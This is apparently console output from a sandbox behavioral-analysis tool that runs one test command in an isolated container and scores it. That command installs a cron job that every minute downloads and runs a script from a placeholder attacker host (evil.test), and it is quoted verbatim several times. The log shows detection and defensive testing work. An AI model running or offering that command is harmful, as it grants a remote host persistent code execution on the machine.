
[1m==========================================
  OpenSandbox Behavioral Analysis Engine v4
==========================================[0m

[0;36m[INFO][0m  待检测命令: echo '* * * * * curl http://evil.test/beacon | bash' | crontab -

[0;36m[INFO][0m  [Step 1/7] 检查环境...
[0;32m[ OK ][0m Docker: Docker version 27.5.1, build 27.5.1-0ubuntu3~24.04.2
[0;32m[ OK ][0m Python: Python 3.12.3
[0;36m[INFO][0m  安装 uv...
downloading uv 0.10.12 x86_64-unknown-linux-gnu
no checksums to verify
installing to /root/.local/bin
  uv
  uvx
everything's installed!
[0;32m[ OK ][0m uv: uv 0.10.12 (x86_64-unknown-linux-gnu)
[0;36m[INFO][0m  [Step 2/7] 预拉取 Docker 镜像...
[0;32m[ OK ][0m 沙箱镜像: opensandbox/code-interpreter:v1.0.2 (已存在)
[0;32m[ OK ][0m Execd镜像: opensandbox/execd:v1.0.7 (已存在)
[0;36m[INFO][0m  [Step 3/7] 安装 Python 依赖...
[0;32m[ OK ][0m opensandbox-server + SDK 已安装
[0;36m[INFO][0m  [Step 4/7] 生成服务端配置...
[0;32m[ OK ][0m 配置写入: /tmp/tmp.eUWQuGdckD/sandbox.toml
[0;36m[INFO][0m  [Step 5/7] 启动 OpenSandbox Server...
[0;32m[ OK ][0m Server 就绪 (PID: 560157, port: 8080)
[0;36m[INFO][0m  [Step 6/7] 创建沙箱并执行深度行为分析...


============================================================================
  1/9  创建隔离沙箱
============================================================================
  镜像: opensandbox/code-interpreter:v1.0.2
  Sandbox ID: 452ab1cc-9d16-414f-88fa-690ad52d2060

============================================================================
  2/9  安装监控工具 (快照前, 避免污染基线)
============================================================================
  监控工具已安装

============================================================================
  3/9  采集执行前基线 (24 维度)
============================================================================
  文件数       : 221689
  SUID/SGID    : 14
  符号链接     : 483
  文件能力     : 1
  基线采集耗时 : 14.9s
  CPU          : 13.5%
  Memory       : 1994.4/15069.3 MiB

============================================================================
  4/9  启动多层探针 + 执行待测命令
============================================================================
  [探针1] inotify: /usr/local/bin /usr/bin /usr/sbin /etc /root /home
  [探针2] inotify: /tmp /var/tmp /dev/shm (独立探针)
  [探针3] network: /proc/net/tcp 轮询 (0.5s)
  [探针5] process: 进程树轮询 (1s)

  --- 命令链分解分析 ---
    命令包含 2 个执行阶段:
    [1] [!!] echo '* * * * * curl http://evil.test/beacon | bash' |
        匹配: download and execute (curl|sh)
    [2] [OK] crontab - END

  --- 命令去混淆分析 ---
    PASS  未发现编码/混淆层

  --- 命令静态分析 ---
    !! [T1105] download and execute (curl|sh) (score: 25)

  $ echo '* * * * * curl http://evil.test/beacon | bash' | crontab -
  ────────────────────────────────────────────────────────────

  耗时     : 1.0s
  退出码   : 127
  stdout   : 0 行
  stderr   : 1 行

  --- stderr (前 30 行) ---
    | bash: line 1: crontab: command not found

============================================================================
  5/9  采集执行后快照 (全维度)
============================================================================
  文件数       : 221689
  SUID/SGID    : 14
  inotify 系统 : 0 条
  inotify /tmp : 205589 条

============================================================================
  6/9  网络行为深度分析
============================================================================

  --- 外部连接 (出站) ---
    (无外部连接)

    [20 个内部连接已忽略]

  --- DNS 配置 ---
    PASS  /etc/resolv.conf 未被修改

============================================================================
  7/9  全维度安全对比分析 (24 维度)
============================================================================

  --- [D1] 文件变更 (+0 / -0) ---
    (无新增)

  --- [D2] 实时文件事件 (inotifywait) ---
    系统目录: (无事件)
    临时目录事件 (6009 条):
      2026-03-20T03:01:41 CREATE /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J
      2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J

  --- [D3] 用户与权限 ---
    PASS  /etc/passwd, shadow, sudoers, SSH, PAM 无变化

  --- [D4] 持久化 (cron/systemd/rc.local/init.d/at) ---
    PASS  无新增

  --- [D5] Shell 环境 (.bashrc/.profile/etc) ---
    PASS  无变化

  --- [D6] 进程树分析 ---
    观察到 17 个独立进程:
      > /opt/opensandbox/execd
      > COMMAND
      > \_ [sleep]
      > \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf
      > \_ bash -c find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null | sort
      > \_ bash -c find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} \; 2>/dev/null | sort || true
      > \_ bash -c getcap -r / 2>/dev/null | sort || true
      > \_ cat /proc/net/tcp /proc/net/tcp6
      > \_ find / -xdev ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;
      > \_ find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} ;
      > \_ getcap -r /
      > \_ sort
      > tail -f /dev/null
      > |   \_ find / -xdev ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;
      > |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
      > |   \_ getcap -r /
      > |   \_ sort

    残留进程 (执行后):
      USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
      root           1  0.0  0.0   3156  1792 ?        Ss   03:01   0:00 tail -f /dev/null
      root           7 18.6  0.1 1244224 21740 ?       Sl   03:01   0:06 /opt/opensandbox/execd
      root         839  0.0  0.0   4752  3456 ?        S    03:01   0:00  \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf '%s %T@ %p\n' 2>/dev/null | sort
      root         841  0.0  0.0   4084  2432 ?        R    03:01   0:00  |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
      root         842  0.0  0.0  24904  3200 ?        R    03:01   0:00  |   \_ sort
      root         840  0.0  0.0   4752  3456 ?        S    03:01   0:00  \_ bash -c ps auxf 2>/dev/null || ps aux
      root         843  0.0  0.0   8280  4480 ?        R    03:01   0:00      \_ ps auxf

  --- [D7] 残留网络连接 ---
        sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
         0: 0100007F:CA84 0100007F:AEE4 01 00000000:00000000 02:00000444 00000000     0        0 3277898 2 0000000000000000 20 4 30 10 -1                  
         1: 0100007F:E922 0100007F:AEE4 01 00000000:00000000 02:00000260 00000000     0        0 3263304 2 0000000000000000 20 4 30 10 -1                  
         2: 0100007F:E952 0100007F:AEE4 01 00000000:00000000 02:00000260 00000000     0        0 3270929 2 0000000000000000 20 4 30 10 -1                  
         3: 0100007F:8774 0100007F:AEE4 01 00000000:00000000 02:0000005B 00000000     0        0 3277353 2 0000000000000000 20 4 30 10 -1                  
         4: 020011AC:8568 525BBD5B:0050 06 00000000:00000000 03:00000003 00000000     0        0 0 3 0000000000000000                                      
         5: 0100007F:87D6 0100007F:AEE4 01 00000000:00000000 02:0000005E 00000000     0        0 3284200 2 0000000000000000 20 4 28 10 -1                  
         6: 0100007F:8DA0 0100007F:AEE4 01 00000000:00000000 02:00000759 00000000     0        0 3296321 2 0000000000000000 20 4 30 10 -1                  
         7: 0100007F:8794 0100007F:AEE4 01 00000000:00000000 02:0000005C 00000000     0        0 3277364 2 0000000000000000 20 4 30 10 -1                  
         8: 0100007F:E912 0100007F:AEE4 01 00000000:00000000 02:000001DD 00000000     0        0 3273808 2 0000000000000000 20 4 30 10 -1                  
         9: 0100007F:E93C 0100007F:AEE4 01 00000000:00000000 02:000004EC 00000000     0        0 3268589 2 0000000000000000 20 4 30 10 -1                  
        10: 0100007F:E928 0100007F:AEE4 01 00000000:00000000 02:00000260 00000000     0        0 3270923 2 0000000000000000 20 4 30 10 -1                  
        11: 0100007F:87B4 0100007F:AEE4 01 00000000:00000000 02:0000005E 00000000     0        0 3284197 2 0000000000000000 20 4 30 10 -1                  
        12: 0100007F:E96C 0100007F:AEE4 01 00000000:00000000 02:00000586 00000000     0        0 3270305 2 0000000000000000 20 4 30 10 -1                  
        13: 0100007F:E930 0100007F:AEE4 01 00000000:00000000 02:00000253 00000000     0        0 3268588 2 0000000000000000 20 4 30 10 -1                  

  --- [D8] 资源消耗 ---
    CPU    : 13.5% -> 3.1% (Δ -10.4%)
    Memory : 1994.4 -> 1888.6 MiB (Δ -105.8 MiB)

  --- [D9] 可疑二进制 (/tmp /var/tmp /dev/shm) ---
    PASS

  --- [D10] SUID/SGID 文件变更 ---
    PASS  无新增 SUID/SGID 文件

  --- [D11] 内核模块 ---
    PASS  无变化

  --- [D12] 挂载点 ---
    PASS  无变化

  --- [D13] 安全相关环境变量 ---
    PASS  无变化

  --- [D14] 关键文件内容分析 ---
    PASS  未发现恶意内容模式

  --- [D15] 关键系统二进制完整性 ---
    PASS  /bin/bash, su, sudo, passwd, sshd 等均未被篡改

  --- [D16] 符号链接变更 ---
    PASS  无新增符号链接

  --- [D17] 文件能力 (Linux Capabilities) ---
    PASS  无新增文件能力

  --- [D18] 输出内容分析 ---
    PASS  输出内容无敏感信息泄露

  --- [D19] 新增文件熵分析 ---
    PASS  无异常高熵文件

  --- [D20] 计划任务详细差异 ---
    PASS  crontab 无变化

  --- [D21] 隐藏进程检测 ---
    PASS  未发现隐藏进程

  --- [D22] 信号处理 / trap 分析 ---
    PASS  未发现恶意信号处理

  --- [D23] 攻击链关联分析 ---
    PASS  未检测到攻击链组合

  --- [D24] 敏感文件权限变更 ---
    PASS  敏感文件权限正常

============================================================================
  8/9  MITRE ATT&CK 技术映射
============================================================================
    [T1105] Ingress Tool Transfer
      └─ 命令匹配恶意模式: download and execute (curl|sh)

============================================================================
  9/9  综合判定
============================================================================

  +──────────────────────────────────────────────────────────────────────────+
  |  [??] 判定: SUSPICIOUS            风险评分:  25/100            |
  |  [██████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░]                              |
  |  置信度: LOW     维度覆盖:  1/24              |
  +──────────────────────────────────────────────────────────────────────────+

  命令           : echo '* * * * * curl http://evil.test/beacon | bash' | crontab -
  合法命令模式   : 否
  退出码         : 127
  文件 +/-       : +0 / -0
  inotify 事件   : 0 系统 + 6009 临时
  外部连接       : 0 个
  SUID/SGID 变更 : +0
  二进制完整性   : PASS
  新增符号链接   : 0
  新增文件能力   : 0
  执行耗时       : 1.0s
  MITRE 技术     : 1 个
  ATT&CK 战术    : Command and Control
  发现           : 0 critical, 1 warnings, 0 info
  置信度         : LOW

  详细发现 (按严重程度排序):
    [ ! ] [静态分析] 命令匹配恶意模式: download and execute (curl|sh) [T1105] (score: 25)

  安全建议:
    -> REVIEW: 建议人工审核此命令后再决定是否放行
    -> 置信度较低, 可能为误报, 请结合上下文判断

  报告 (JSON) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773975738.json
  报告 (文本) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773975738.txt
  报告 (SARIF): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773975738.sarif.json

  快速预判: BLOCK (静态分: 25, 模式匹配: 1)

============================================================================
  人类可读摘要:
============================================================================
  ⚠️ 判定: SUSPICIOUS (风险分: 25/100, 置信度: LOW)
  命令: echo '* * * * * curl http://evil.test/beacon | bash' | crontab -
  
  发现 1 个问题 (0 严重, 1 警告):
    [WARN] 静态分析: 命令匹配恶意模式: download and execute (curl|sh) [T1105]
  
  涉及 ATT&CK 战术: Command and Control
  
  建议:
    • REVIEW: 建议人工审核此命令后再决定是否放行
    • 置信度较低, 可能为误报, 请结合上下文判断

  沙箱已销毁。


[0;36m[INFO][0m  [Step 7/7] 完成!
[0;32m[ OK ][0m 报告 (JSON): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773975738.json
[0;32m[ OK ][0m 报告 (文本): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773975738.txt
  查看: python3 -m json.tool /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773975738.json
  快速预判: FAST_TRIAGE=1 COMMAND='...' ./checker.sh

[0;36m[INFO][0m  Cleaning up...
[0;32m[ OK ][0m Cleanup done.
